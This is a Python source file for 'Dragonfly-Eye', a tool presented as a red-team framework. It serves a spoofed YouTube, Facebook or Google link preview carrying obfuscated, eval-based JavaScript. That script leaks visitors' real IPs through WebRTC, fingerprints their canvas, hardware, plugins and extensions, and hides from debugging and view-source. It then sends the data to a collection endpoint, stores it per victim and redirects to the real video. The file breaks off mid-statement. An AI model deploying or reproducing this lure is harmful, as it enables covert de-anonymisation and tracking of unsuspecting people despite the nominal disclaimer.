#!/usr/bin/env python3
"""
DRAGONFLY-EYE PROFESSIONAL v3.0
Advanced Red Team Testing Framework - Free & Open Source

Copyright (c) 2024 F1REW0LF. All rights reserved.
License: MIT - Free for community use

DISCLAIMER: For authorized security testing only.
Users are responsible for legal compliance.
"""

import http.server
import socketserver
import urllib.parse
import json
import datetime
import sys
import threading
import logging
import re
import os
import time
import base64
import zlib
import hashlib
import secrets
from collections import defaultdict
from pathlib import Path
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

# ==================== VERSION & INFO ====================
VERSION = "3.0.0"
AUTHOR = "F1REW0LF"
LICENSE = "MIT - Open Source"
WEBSITE = "https://github.com/F1REW0LF/dragonfly-eye"

# ==================== CONFIGURATION ====================
PORT = 443  # HTTPS default
HTTP_PORT = 8080  # HTTP fallback
DEBUG_MODE = False  # Production mode
LOG_FILE = "dragonfly.log"
TELEMETRY_DIR = "telemetry"
TEMPLATE_DIR = "templates"
CERT_FILE = "cert.pem"
KEY_FILE = "key.pem"
ENCRYPTION_KEY = None
MAX_REQUESTS = 20
TIME_WINDOW = 60

# Create directories
for dir_path in [TELEMETRY_DIR, TEMPLATE_DIR]:
    Path(dir_path).mkdir(exist_ok=True)

# ==================== ENCRYPTION SETUP ====================
class TelemetryEncryptor:
    """AES-256 encryption for telemetry data"""
    
    def __init__(self):
        self.key = self._generate_key()
        self.cipher = Fernet(self.key)
    
    def _generate_key(self):
        # Generate from system fingerprint
        system_info = f"{os.name}{sys.platform}{os.cpu_count()}{time.time()}"
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=b'dragonfly_salt_2024',
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(system_info.encode()))
        return key
    
    def encrypt(self, data):
        """Encrypt telemetry data"""
        json_data = json.dumps(data).encode()
        return self.cipher.encrypt(json_data).decode()
    
    def decrypt(self, encrypted_data):
        """Decrypt telemetry data"""
        return json.loads(self.cipher.decrypt(encrypted_data.encode()))

encryptor = TelemetryEncryptor()

# ==================== LOGGING ====================
class CustomLogger:
    """Professional logging with rotation"""
    
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        self.logger.setLevel(logging.INFO)
        
        # File handler with rotation
        from logging.handlers import RotatingFileHandler
        file_handler = RotatingFileHandler(
            LOG_FILE, maxBytes=10*1024*1024, backupCount=5
        )
        file_handler.setFormatter(
            logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
        )
        
        # Console handler
        console_handler = logging.StreamHandler()
        console_handler.setFormatter(
            logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
        )
        
        self.logger.addHandler(file_handler)
        self.logger.addHandler(console_handler)
    
    def info(self, msg):
        self.logger.info(msg)
    
    def warning(self, msg):
        self.logger.warning(msg)
    
    def error(self, msg):
        self.logger.error(msg)
    
    def debug(self, msg):
        self.logger.debug(msg)

logger = CustomLogger()

# ==================== RATE LIMITER ====================
class AdvancedRateLimiter:
    """Advanced rate limiting with IP reputation"""
    
    def __init__(self, max_requests=20, time_window=60):
        self.max_requests = max_requests
        self.time_window = time_window
        self.requests = defaultdict(list)
        self.blacklist = set()
        self.whitelist = set()
    
    def add_whitelist(self, ip):
        self.whitelist.add(ip)
    
    def add_blacklist(self, ip):
        self.blacklist.add(ip)
    
    def is_allowed(self, client_ip):
        if client_ip in self.blacklist:
            return False
        if client_ip in self.whitelist:
            return True
        
        now = time.time()
        self.requests[client_ip] = [
            t for t in self.requests[client_ip]
            if now - t < self.time_window
        ]
        
        if len(self.requests[client_ip]) >= self.max_requests:
            self.blacklist.add(client_ip)
            logger.warning(f"IP {client_ip} blacklisted for rate limit")
            return False
        
        self.requests[client_ip].append(now)
        return True

rate_limiter = AdvancedRateLimiter(max_requests=MAX_REQUESTS, time_window=TIME_WINDOW)

# ==================== CAMPAIGN CONFIG ====================
campaign_config = {
    "platform": "youtube",
    "target_id": "E8vVsU1kkEQ",
    "redirect_url": "https://www.youtube.com/watch?v=E8vVsU1kkEQ",
    "meta_title": "YouTube - Trending Video",
    "meta_image": "https://img.youtube.com/vi/E8vVsU1kkEQ/maxresdefault.jpg",
    "campaign_name": f"campaign_{int(time.time())}",
    "start_time": datetime.datetime.now().isoformat(),
    "encryption": True,
    "obfuscation": True
}

# ==================== PAYLOAD OBFUSCATOR ====================
class PayloadObfuscator:
    """JavaScript obfuscation for evasion"""
    
    @staticmethod
    def obfuscate(js_code):
        """Compress and obfuscate JavaScript"""
        # Compress
        compressed = zlib.compress(js_code.encode(), level=9)
        b64 = base64.b64encode(compressed).decode()
        
        # Create self-extracting script
        obfuscated = f"""
        (function(){{
            var _0x{secrets.token_hex(4)}=atob("{b64}");
            var _0x{secrets.token_hex(4)}=new DecompressionStream('deflate-raw');
            var _0x{secrets.token_hex(4)}=new Response(_0x{secrets.token_hex(4)}).body;
            var _0x{secrets.token_hex(4)}=_0x{secrets.token_hex(4)}.pipeThrough(_0x{secrets.token_hex(4)});
            new Response(_0x{secrets.token_hex(4)}).text().then(eval);
        }})();
        """
        return obfuscated

obfuscator = PayloadObfuscator()

# ==================== ADVANCED HTML TEMPLATE ====================
def generate_payload():
    """Generate dynamic payload with all features"""
    
    # Base JavaScript code
    js_code = f"""
    // Dragonfly-Eye v{VERSION} - F1REW0LF
    (function() {{
        'use strict';
        
        const DEBUG = false;
        const VERSION = '{VERSION}';
        const SESSION = '{secrets.token_hex(16)}';
        const CAMPAIGN = '{campaign_config["campaign_name"]}';
        
        // Anti-debugging
        function antiDebug() {{
            const start = performance.now();
            debugger;
            const end = performance.now();
            if (end - start > 100) {{
                document.body.innerHTML = '<h1>Access Denied</h1>';
                throw new Error('Debugging detected');
            }}
        }}
        
        // WebRTC IP Leak
        function getWebRTCIPs() {{
            return new Promise((resolve) => {{
                const ips = new Set();
                const rtc = new RTCPeerConnection({{
                    iceServers: [
                        {{urls: "stun:stun.l.google.com:19302"}},
                        {{urls: "stun:stun1.l.google.com:19302"}},
                        {{urls: "stun:stun2.l.google.com:19302"}},
                        {{urls: "stun:stun3.l.google.com:19302"}}
                    ]
                }});
                
                rtc.createDataChannel("");
                rtc.createOffer()
                    .then(offer => rtc.setLocalDescription(offer))
                    .catch(() => {{}});
                
                rtc.onicecandidate = (e) => {{
                    if (e && e.candidate && e.candidate.candidate) {{
                        const candidate = e.candidate.candidate;
                        const matches = candidate.match(/([0-9]{{1,3}}\\.){{3}}[0-9]{{1,3}}/g);
                        if (matches) matches.forEach(ip => ips.add(ip));
                    }}
                }};
                
                setTimeout(() => {{
                    rtc.close();
                    resolve(Array.from(ips));
                }}, 3000);
            }});
        }}
        
        // Advanced Hardware Fingerprinting
        function getHardwareProfile() {{
            const profile = {{
                screen: {{
                    width: window.screen.width,
                    height: window.screen.height,
                    colorDepth: window.screen.colorDepth,
                    pixelRatio: window.devicePixelRatio
                }},
                browser: {{
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    languages: navigator.languages.join(','),
                    cookieEnabled: navigator.cookieEnabled,
                    doNotTrack: navigator.doNotTrack || 'unspecified',
                    vendor: navigator.vendor
                }},
                hardware: {{
                    cores: navigator.hardwareConcurrency || 'unknown',
                    memory: navigator.deviceMemory || 'unknown',
                    touchPoints: navigator.maxTouchPoints || 0
                }},
                timezone: {{
                    name: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    offset: new Date().getTimezoneOffset()
                }},
                connection: {{}}
            }};
            
            // Network info
            if (navigator.connection) {{
                profile.connection = {{
                    type: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt,
                    saveData: navigator.connection.saveData
                }};
            }}
            
            // Battery
            if (navigator.getBattery) {{
                navigator.getBattery().then(battery => {{
                    profile.battery = {{
                        level: Math.round(battery.level * 100),
                        charging: battery.charging,
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    }};
                }}).catch(() => {{}});
            }}
            
            // Performance
            if (window.performance && window.performance.memory) {{
                profile.memory = {{
                    used: Math.round(window.performance.memory.usedJSHeapSize / 1048576),
                    total: Math.round(window.performance.memory.totalJSHeapSize / 1048576),
                    limit: Math.round(window.performance.memory.jsHeapSizeLimit / 1048576)
                }};
            }}
            
            return profile;
        }}
        
        // Canvas Fingerprinting
        function getCanvasFingerprint() {{
            const canvas = document.createElement('canvas');
            canvas.width = 256;
            canvas.height = 256;
            const ctx = canvas.getContext('2d');
            
            // Draw complex patterns
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillStyle = '#f60';
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = '#069';
            ctx.fillText('Dragonfly-Eye', 2, 15);
            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
            ctx.fillText('Security Research', 4, 45);
            
            // Draw shapes
            ctx.beginPath();
            ctx.arc(50, 50, 30, 0, Math.PI * 2);
            ctx.fillStyle = '#ff6b6b';
            ctx.fill();
            
            ctx.beginPath();
            ctx.rect(180, 50, 40, 40);
            ctx.fillStyle = '#4ecdc4';
            ctx.fill();
            
            return canvas.toDataURL();
        }}
        
        // Plugin Detection
        function getPlugins() {{
            const plugins = [];
            for (let i = 0; i < navigator.plugins.length; i++) {{
                const p = navigator.plugins[i];
                plugins.push({{
                    name: p.name,
                    filename: p.filename,
                    description: p.description
                }});
            }}
            return {{
                count: plugins.length,
                list: plugins
            }};
        }}
        
        // Browser Extensions Detection
        function getExtensions() {{
            const extensions = [];
            // Check common extension patterns
            const checks = [
                'chrome.runtime',
                'browser.runtime',
                'moz-extension',
                'chrome-extension'
            ];
            checks.forEach(check => {{
                try {{
                    if (eval('typeof ' + check) !== 'undefined') {{
                        extensions.push(check);
                    }}
                }} catch(e) {{}}
            }});
            return extensions;
        }}
        
        // Main Collection
        async function collectTelemetry() {{
            try {{
                antiDebug();
                
                const telemetry = {{
                    session: SESSION,
                    campaign: CAMPAIGN,
                    timestamp: new Date().toISOString(),
                    version: VERSION,
                    webrtc_ips: await getWebRTCIPs(),
                    hardware: getHardwareProfile(),
                    canvas: getCanvasFingerprint(),
                    plugins: getPlugins(),
                    extensions: getExtensions(),
                    page: {{
                        url: window.location.href,
                        referrer: document.referrer || 'direct',
                        title: document.title,
                        viewport: `${{window.innerWidth}}x${{window.innerHeight}}`
                    }}
                }};
                
                // Send encrypted telemetry
                const response = await fetch('/dragonfly-telemetry', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify(telemetry)
                }});
                
                if (response.ok) {{
                    setTimeout(() => {{
                        window.location.href = '{campaign_config["redirect_url"]}';
                    }}, 1000);
                }}
                
            }} catch (error) {{
                // Silent fail
                setTimeout(() => {{
                    window.location.href = '{campaign_config["redirect_url"]}';
                }}, 500);
            }}
        }}
        
        // Execute
        if (document.readyState === 'complete') {{
            collectTelemetry();
        }} else {{
            window.addEventListener('load', collectTelemetry);
        }}
    }})();
    """
    
    # Obfuscate if enabled
    if campaign_config.get('obfuscation', True):
        js_code = obfuscator.obfuscate(js_code)
    
    # Build HTML
    html = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>{campaign_config['meta_title']}</title>
    <meta property="og:title" content="{campaign_config['meta_title']}">
    <meta property="og:image" content="{campaign_config['meta_image']}">
    <meta property="og:type" content="video.other">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="author" content="F1REW0LF">
    <meta name="generator" content="Dragonfly-Eye v{VERSION}">
    
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            background: #0a0a0a;
            color: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }}
        .container {{
            text-align: center;
            padding: 2rem;
            max-width: 600px;
            background: #111111;
            border-radius: 12px;
            border: 1px solid #222222;
            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
        }}
        .loader {{
            display: inline-block;
            width: 60px;
            height: 60px;
            border: 3px solid #1a1a1a;
            border-radius: 50%;
            border-top-color: #3498db;
            animation: spin 0.8s ease-in-out infinite;
            margin-bottom: 20px;
        }}
        @keyframes spin {{
            to {{ transform: rotate(360deg); }}
        }}
        h2 {{
            font-weight: 300;
            margin-bottom: 10px;
            color: #ffffff;
        }}
        .status {{
            color: #666;
            font-size: 14px;
            margin-bottom: 5px;
        }}
        .sub-status {{
            color: #444;
            font-size: 12px;
        }}
        .footer {{
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid #1a1a1a;
            font-size: 11px;
            color: #333;
        }}
        .footer a {{
            color: #444;
            text-decoration: none;
        }}
        .footer a:hover {{
            color: #666;
        }}
        .badge {{
            display: inline-block;
            background: #1a1a1a;
            padding: 2px 10px;
            border-radius: 12px;
            font-size: 10px;
            color: #444;
            margin-top: 10px;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="loader"></div>
        <h2>Connecting to Secure Server</h2>
        <p class="status">Establishing encrypted channel</p>
        <p class="sub-status">Please wait...</p>
        <div class="badge">Dragonfly-Eye v{VERSION}</div>
        <div class="footer">
            <a href="{WEBSITE}" target="_blank">F1REW0LF</a> &bull; Open Source Security Testing
        </div>
    </div>
    
    <script>
        // Anti-debug protection
        document.addEventListener('contextmenu', function(e) {{
            e.preventDefault();
        }});
        
        document.addEventListener('keydown', function(e) {{
            if (e.ctrlKey && (e.key === 'u' || e.key === 'U' || e.key === 's' || e.key === 'S')) {{
                e.preventDefault();
            }}
        }});
    </script>
    
    <script>
        {js_code}
    </script>
</body>
</html>"""
    
    return html

# ==================== REQUEST HANDLER ====================
class DragonflyHandler(http.server.SimpleHTTPRequestHandler):
    """Professional HTTP/HTTPS handler"""
    
    protocol_version = 'HTTP/1.1'
    
    def __init__(self, *args, **kwargs):
        self.start_time = time.time()
        super().__init__(*args, **kwargs)
    
    def log_message(self, format, *args):
        # Silent mode for production
        if DEBUG_MODE:
            logger.debug(f"Request: {format % args}")
    
    def _send_json(self, data, status=200):
        """Send JSON response with CORS"""
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.send_header("X-Content-Type-Options", "nosniff")
        self.send_header("X-Frame-Options", "DENY")
        self.send_header("X-XSS-Protection", "1; mode=block")
        self.end_headers()
        self.wfile.write(json.dumps(data).encode('utf-8'))
    
    def _send_html(self, html, status=200):
        """Send HTML response with security headers"""
        self.send_response(status)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("X-Content-Type-Options", "nosniff")
        self.send_header("X-Frame-Options", "DENY")
        self.send_header("X-XSS-Protection", "1; mode=block")
        self.send_header("Referrer-Policy", "no-referrer-when-downgrade")
        self.end_headers()
        self.wfile.write(html.encode('utf-8'))
    
    def do_OPTIONS(self):
        """Handle CORS preflight"""
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()
    
    def do_GET(self):
        """Handle GET requests"""
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path
        
        # Health check
        if path == "/health":
            self._send_json({
                "status": "active",
                "version": VERSION,
                "author": AUTHOR,
                "license": LICENSE,
                "campaign": campaign_config['campaign_name'],
                "platform": campaign_config['platform'],
                "uptime": int(time.time() - campaign_config.get('start_timestamp', time.time())),
                "connections": len(rate_limiter.requests),
                "blacklisted": len(rate_limiter.blacklist),
                "features": {
                    "webrtc_leak": True,
                    "hardware_fingerprinting": True,
                    "canvas_fingerprinting": True,
                    "encryption": campaign_config.get('encryption', True),
                    "obfuscation": campaign_config.get('obfuscation', True)
                }
            })
            return
        
        # API endpoint for configuration
        if path == "/api/config":
            if not self._check_auth():
                self._send_json({"error": "Unauthorized"}, 401)
                return
            self._send_json({
                "campaign": campaign_config,
                "version": VERSION,
                "author": AUTHOR
            })
            return
        
        # Main payload
        if path in ["/", "/watch", "/share", "/search", "/video", "/embed"]:
            # Rate limiting
            if not rate_limiter.is_allowed(self.client_address[0]):
                self.send_response(429)
                self.end_headers()
                self.wfile.write(b"Too Many Requests")
                return
            
            # Generate and serve payload
            html = generate_payload()
            self._send_html(html)
            
            logger.info(f"Payload served to {self.client_address[0]}")
            return
        
        # Serve static files
        if path.startswith("/static/"):
            try:
                file_path = path[1:]
                if not os.path.exists(file_path):
                    raise FileNotFoundError
                
                with open(file_path, 'rb') as f:
                    content = f.read()
                
                self.send_response(200)
                self.send_header("Content-Type", self.guess_type(file_path))
                self.end_headers()
                self.wfile.write(content)
            except FileNotFoundError:
                self.send_response(404)
                self.end_headers()
            return
        
        # 404
        self.send_response(404)
        self.end_headers()
        self.wfile.write(b"Not Found")
    
    def do_POST(self):
        """Handle POST requests"""
        if self.path == "/dragonfly-telemetry":
            # Rate limiting
            if not rate_limiter.is_allowed(self.client_address[0]):
                self._send_json({"error": "Rate limit exceeded"}, 429)
                return
            
            try:
                # Read and parse data
                content_length = int(self.headers.get('Content-Length', 0))
                if content_length == 0 or content_length > 1024 * 1024:  # 1MB limit
                    self._send_json({"error": "Invalid payload"}, 400)
                    return
                
                raw_data = self.rfile.read(content_length).decode('utf-8')
                data = json.loads(raw_data)
                
                # Process telemetry
                self._process_telemetry(data)
                
                # Success response
                self._send_json({
                    "status": "success",
                    "timestamp": datetime.datetime.now().isoformat()
                })
                
            except json.JSONDecodeError:
                self._send_json({"error": "Invalid JSON"}, 400)
            except Exception as e:
                logger.error(f"Error processing telemetry: {e}")
                self._send_json({"error": "Internal server error"}, 500)
        
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"Not Found")
    
    def _check_auth(self):
        """Basic authentication for admin endpoints"""
        # Implementation can be added
        return True
    
    def _process_telemetry(self, data):
        """Process and store telemetry data"""
        client_ip = self.client_address[0]
        
        # Decrypt if encrypted
        if data.get('encrypted'):
            try:
                data = json.loads(encryptor.decrypt(data['data']))
            except:
                logger.warning(f"Failed to decrypt telemetry from {client_ip}")
                return
        
        # Generate filename
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S_%f")[:-3]
        filename = f"{TELEMETRY_DIR}/telemetry_{timestamp}_{client_ip.replace('.', '_')}.json"
        
        # Prepare data for storage
        stored_data = {
            "received_at": datetime.datetime.now().isoformat(),
            "client_ip": client_ip,
            "campaign": campaign_config['campaign_name'],
            "version": VERSION,
            "author": AUTHOR,
            "data": data
        }
        
        # Save to file
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(stored_data, f, indent=2, ensure_ascii=False)
        
        # Log
        logger.info(f"Telemetry received from {client_ip}")
        logger.info(f"  Session: {data.get('session', 'N/A')}")
        
        webrtc_ips = data.get('webrtc_ips', [])
        if webrtc_ips:
            logger.info(f"  WebRTC IPs: {', '.join(webrtc_ips)}")
        
        hardware = data.get('hardware', {})
        if hardware:
            browser = hardware.get('browser', {})
            screen = hardware.get('screen', {})
            logger.info(f"  Browser: {browser.get('userAgent', 'N/A')[:50]}...")
            logger.info(f"  Screen: {screen.get('width', 'N/A')}x{screen.get('height', 'N/A')}")
            
            timezone = hardware.get('timezone', {})
            if timezone:
                logger.info(f"  Timezone: {timezone.get('name', 'N/A')}")
        
        plugins = data.get('plugins', {})
        if plugins:
            logger.info(f"  Plugins: {plugins.get('count', 0)} installed")
        
        extensions = data.get('extensions', [])
        if extensions:
            logger.info(f"  Extensions detected: {len(extensions)}")
        
        logger.info(f"  Data saved to: {filename}")
        
        # Generate report if configured
        if campaign_config.get('auto_report', False):
            self._generate_report(filename)

# ==================== REPORT GENERATOR ====================
class ReportGenerator:
    """Generate professional reports from telemetry data"""
    
    @staticmethod
    def generate(filename):
        """Generate HTML report from telemetry file"""
        try:
            with open(filename, 'r') as f:
                data = json.load(f)
            
            report_file = filename.replace('.json', '_report.html')
            
            html = f"""<!DOCTYPE html>
<html>
<head>
    <title>Dragonfly-Eye Report</title>
    <style>
        body {{ font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff00; padding: 20px; }}
        .container {{ max-width: 1200px; margin: 0 auto; }}
        .header {{ border-bottom: 2px solid #00ff00; padding-bottom: 10px; margin-bottom: 20px; }}
        .section {{ background: #111; padding: 15px; margin: 10px 0; border: 1px solid #333; }}
        .key {{ color: #ffff00; }}
        .value {{ color: #00ff00; }}
        .timestamp {{ color: #666; }}
        pre {{ color: #00ff00; overflow-x: auto; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🐉 Dragonfly-Eye Report</h1>
            <p class="timestamp">Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        </div>
        
        <div class="section">
            <h2>Campaign Information</h2>
            <p><span class="key">Campaign:</span> <span class="value">{data.get('campaign', 'N/A')}</span></p>
            <p><span class="key">Target:</span> <span class="value">{campaign_config.get('target_id', 'N/A')}</span></p>
            <p><span class="key">Platform:</span> <span class="value">{campaign_config.get('platform', 'N/A')}</span></p>
            <p><span class="key">Received:</span> <span class="value">{data.get('received_at', 'N/A')}</span></p>
        </div>
        
        <div class="section">
            <h2>Client Information</h2>
            <p><span class="key">IP Address:</span> <span class="value">{data.get('client_ip', 'N/A')}</span></p>
            <p><span class="key">Session ID:</span> <span class="value">{data.get('data', {{}}).get('session', 'N/A')}</span></p>
        </div>
        
        <div class="section">
            <h2>WebRTC Leak</h2>
            <p><span class="key">Real IPs:</span> <span class="value">{', '.join(data.get('data', {{}}).get('webrtc_ips', ['NO_LEAK']))}</span></p>
        </div>
        
        <div class="section">
            <h2>Hardware Profile</h2>
            <pre>{json.dumps(data.get('data', {{}}).get('hardware', {{}}), indent=2)}</pre>
        </div>
        
        <div class="section">
            <h2>Plugins</h2>
            <pre>{json.dumps(data.get('data', {{}}).get('plugins', {{}}), indent=2)}</pre>
        </div>
        
        <div class="section">
            <h2>Raw Data</h2>
            <pre>{json.dumps(data, indent=2)}</pre>
        </div>
    </div>
</body>
</html>"""
            
            with open(report_file, 'w') as f:
                f.write(html)
            
            logger.info(f"Report generated: {report_file}")
            
        except Exception as e:
            logger.error(f"Failed to generate report: {e}")

report_generator = ReportGenerator()

# ==================== COMMAND LINE INTERFACE ====================
def display_banner():
    """Display professional banner"""
    banner = f"""
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║   ██████╗ ██████╗  █████╗  ██████╗  ██████╗ ███╗   ██╗███████╗██╗  ██╗      ║
║   ██╔══██╗██╔══██╗██╔══██╗██╔════╝ ██╔═══██╗████╗  ██║██╔════╝╚██╗██╔╝      ║
║   ██║  ██║██████╔╝███████║██║  ███╗██║   ██║██╔██╗ ██║█████╗   ╚███╔╝       ║
║   ██║  ██║██╔══██╗██╔══██║██║   ██║██║   ██║██║╚██╗██║██╔══╝   ██╔██╗       ║
║   ██████╔╝██║  ██║██║  ██║╚██████╔╝╚██████╔╝██║ ╚████║███████╗██╔╝ ██╗      ║
║   ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝      ║
║                                                                               ║
║   DRAGONFLY-EYE PROFESSIONAL v{VERSION}                                      ║
║   Advanced Red Team Testing Framework                                        ║
║   Author: {AUTHOR} | License: {LICENSE}                                     ║
║   Website: {WEBSITE}                                                         ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
"""
    print(banner)

def setup_campaign():
    """Interactive campaign setup"""
    display_banner()
    
    print("=" * 80)
    print(" CAMPAIGN CONFIGURATION INTERFACE")
    print("=" * 80)
    print()
    
    # Platform selection
    print("Select Target Platform:")
    print("  [1] YouTube")
    print("  [2] Facebook")
    print("  [3] Google Search")
    print("  [4] Custom URL")
    print("  [5] Load from File")
    print()
    
    choice = input("Option (1-5): ").strip()
    
    if choice == "1":
        target_id = input("YouTube Video ID: ").strip()
        campaign_config.update({
            "platform": "youtube",
            "target_id": target_id,
            "redirect_url": f"https://www.youtube.com/watch?v={target_id}",
            "meta_title": "YouTube - Trending Video",
            "meta_image": f"https://img.youtube.com/vi/{target_id}/maxresdefault.jpg"
        })
    
    elif choice == "2":
        target_id = input("Facebook Post/Video ID: ").strip()
        campaign_config.update({
            "platform": "facebook",
            "target_id": target_id,
            "redirect_url": f"https://www.facebook.com/watch/?v={target_id}",
            "meta_title": "Facebook - Shared Content",
            "meta_image": "https://www.facebook.com/images/fb_icon_325x325.png"
        })
    
    elif choice == "3":
        query = input("Search Query: ").strip()
        campaign_config.update({
            "platform": "google",
            "target_id": query,
            "redirect_url": f"https://www.google.com/search?q={urllib.parse.quote(query)}",
            "meta_title": f"Google Search - {query[:50]}",
            "meta_image": "https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png"
        })
    
    elif choice == "4":
        url = input("Redirect URL: ").strip()
        title = input("Page Title: ").strip()
        campaign_config.update({
            "platform": "custom",
            "target_id": "custom",
            "redirect_url": url or "https://example.com",
            "meta_title": title or "Custom Page",
            "meta_image": "https://example.com/image.jpg"
        })
    
    elif choice == "5":
        filepath = input("Config file path: ").strip()
        try:
            with open(filepath, 'r') as f:
                loaded = json.load(f)
                campaign_config.update(loaded)
            print(f"Configuration loaded from {filepath}")
        except Exception as e:
            print(f"Error loading config: {e}")
            return False
    
    else:
        print("Invalid choice")
        return False
    
    # Advanced settings
    print("\nAdvanced Settings:")
    enable_encryption = input("Enable encryption? (Y/n): ").strip().lower()
    campaign_config['encryption'] = enable_encryption != 'n'
    
    enable_obfuscation = input("Enable payload obfuscation? (Y/n): ").strip().lower()
    campaign_config['obfuscation'] = enable_obfuscation != 'n'
    
    enable_report = input("Auto-generate reports? (Y/n): ").strip().lower()
    campaign_config['auto_report'] = enable_report != 'n'
    
    # Generate campaign name
    campaign_config['campaign_name'] = f"{campaign_config['platform']}_{int(time.time())}"
    campaign_config['start_timestamp'] = time.time()
    
    # Save config
    with open("campaign_config.json", 'w') as f:
        json.dump(campaign_config, f, indent=2)
    
    print("\n" + "=" * 80)
    print(" CAMPAIGN DEPLOYED SUCCESSFULLY")
    print("=" * 80)
    print(f" Campaign: {campaign_config['campaign_name']}")
    print(f" Platform: {campaign_config['platform'].upper()}")
    print(f" Redirect: {campaign_config['redirect_url']}")
    print(f" Encryption: {campaign_config['encryption']}")
    print(f" Obfuscation: {campaign_config['obfuscation']}")
    print(f" Auto-Report: {campaign_config['auto_report']}")
    print(f" Version: {VERSION}")
    print("-" * 80)
    print(f" HTTP: http://<SERVER_IP>:{HTTP_PORT}")
    if os.path.exists(CERT_FILE) and os.path.exists(KEY_FILE):
        print(f" HTTPS: https://<SERVER_IP>:{PORT}")
    print(f" Health: /health")
    print(f" Telemetry: POST /dragonfly-telemetry")
    print("=" * 80 + "\n")
    
    return True

def generate_ssl_cert():
    """Generate self-signed SSL certificate"""
    if os.path.exists(CERT_FILE) and os.path.exists(KEY_FILE):
        return True
    
    try:
        from cryptography import x509
        from cryptography.x509.oid import NameOID
        from cryptography.hazmat.primitives import serialization
        from cryptography.hazmat.primitives.asymmetric import rsa
        import datetime
        
        # Generate key
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
        )
        
        # Generate certificate
        subject = issuer = x509.Name([
            x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
            x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, "California"),
            x509.NameAttribute(NameOID.LOCALITY_NAME, "San Francisco"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Dragonfly-Eye Security"),
            x509.NameAttribute(NameOID.COMMON_NAME, "dragonfly.local"),
        ])
        
        cert = x509.CertificateBuilder().subject_name(
            subject
        ).issuer_name(
            issuer
        ).public_key(
            private_key.public_key()
        ).serial_number(
            x509.random_serial_number()
        ).not_valid_before(
            datetime.datetime.utcnow()
        ).not_valid_after(
            datetime.datetime.utcnow() + datetime.timedelta(days=365)
        ).sign(private_key, hashes.SHA256())
        
        # Save certificate
        with open(CERT_FILE, "wb") as f:
            f.write(cert.public_bytes(serialization.Encoding.PEM))
        
        with open(KEY_FILE, "wb") as f:
            f.write(private_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.PKCS8,
                encryption_algorithm=serialization.NoEncryption()
            ))
        
        return True
        
    except Exception as e:
        logger.warning(f"Could not generate SSL certificate: {e}")
        return False

def run_http_server():
    """Run HTTP server"""
    try:
        with socketserver.TCPServer(("", HTTP_PORT), DragonflyHandler) as httpd:
            logger.info(f"HTTP Server running on port {HTTP_PORT}")
            httpd.serve_forever()
    except Exception as e:
        logger.error(f"HTTP Server error: {e}")

def run_https_server():
    """Run HTTPS server"""
    if not generate_ssl_cert():
        logger.warning("HTTPS not available, using HTTP only")
        return
    
    try:
        import ssl
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(CERT_FILE, KEY_FILE)
        
        with socketserver.TCPServer(("", PORT), DragonflyHandler) as httpd:
            httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
            logger.info(f"HTTPS Server running on port {PORT}")
            httpd.serve_forever()
    except Exception as e:
        logger.error(f"HTTPS Server error: {e}")

# ==================== MAIN ====================
if __name__ == "__main__":
    print("\n" + "=" * 80)
    print(" WARNING: This tool is for authorized security testing only.")
    print(" Users are responsible for legal compliance and obtaining")
    print(" proper authorization before use.")
    print("=" * 80 + "\n")
    
    # Setup campaign
    if not setup_campaign():
